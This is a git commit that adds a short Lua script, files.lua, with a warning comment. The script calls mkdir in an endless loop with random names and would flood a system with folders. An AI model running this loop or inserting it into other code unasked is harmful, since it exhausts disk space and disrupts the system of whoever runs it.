4a629beb89c3f645874d25064df8dd41486c2af7
oxzh <gabriel_alcantara12@outlook.com>
2024-02-22 21:00:02 -0300

    create folder script

---
+++ files.lua
@@ -0,0 +1,7 @@
+--WARN! THIS CODE WILL CREATE A LOT OF FOLDERS IN YOUR SYSTEM! CAUTION!
+for i = 1, math.huge do
+    local folders = math.random()
+    local folder = os.execute("mkdir" .. " " .. folders )
+             
+end
+
